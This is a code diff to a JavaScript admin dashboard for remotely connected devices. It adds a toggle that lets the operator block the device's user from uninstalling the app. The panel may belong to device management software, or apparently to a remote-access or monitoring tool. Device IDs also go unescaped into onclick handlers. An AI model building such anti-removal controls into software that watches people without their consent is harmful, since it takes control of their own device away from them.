@@ -688,6 +688,31 @@ async function deleteDevice(deviceId, deviceName) {
   }
 }
 
+async function toggleAntiUninstall(deviceId, currentState) {
+  const newState = currentState ? false : true;
+  const label = newState ? 'ENABLE' : 'DISABLE';
+  if (!confirm(`${label} anti-uninstall protection for this device?\n\n${newState ? 'The user will NOT be able to uninstall the app.' : 'The user WILL be able to uninstall the app.'}`)) return;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}/anti-uninstall`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
+      body: JSON.stringify({ enabled: newState })
+    });
+    const data = await res.json();
+    if (data.success) {
+      // Update in-memory state
+      const dev = allDevices.find(d => d.device_id === deviceId);
+      if (dev) dev.anti_uninstall = data.anti_uninstall;
+      renderDeviceGrid();
+      showToast(`Anti-uninstall ${newState ? 'ENABLED' : 'DISABLED'}`, 'success');
+    } else {
+      showToast('Failed to toggle protection', 'error');
+    }
+  } catch (err) {
+    showToast('Toggle failed: ' + err.message, 'error');
+  }
+}
+
 function renderDeviceGrid() {
   const grid = document.getElementById('deviceGrid');
   if (!allDevices || allDevices.length === 0) {
@@ -800,6 +825,15 @@ function renderDeviceGrid() {
         <div class="dev-row">
           <span class="dev-row-label">LAST SEEN</span>
           <span class="dev-row-value">${d.last_seen ? new Date(d.last_seen).toLocaleString() : '?'}</span>
+        </div>
+        <div class="dev-row dev-anti-row">
+          <span class="dev-row-label">PROTECTION</span>
+          <span class="dev-row-value">
+            <button class="anti-uninstall-btn ${d.anti_uninstall ? 'on' : 'off'}" onclick="event.stopPropagation(); toggleAntiUninstall('${d.device_id}', ${d.anti_uninstall ? 1 : 0})" title="Anti-Uninstall Protection">
+              <i class="ri-${d.anti_uninstall ? 'shield-check-line' : 'shield-line'}"></i>
+              <span>${d.anti_uninstall ? 'ANTI-UNINSTALL ON' : 'ANTI-UNINSTALL OFF'}</span>
+            </button>
+          </span>
         </div>
       </div>
       ${!isOnline ? `<div class="dev-delete-wrap"><button class="dev-delete-btn" onclick="event.stopPropagation(); deleteDevice('${d.device_id}', '${esc(deviceName).replace(/'/g, "\\'")}')"><i class="ri-delete-bin-line"></i> DELETE DEVICE</button></div>` : ''}
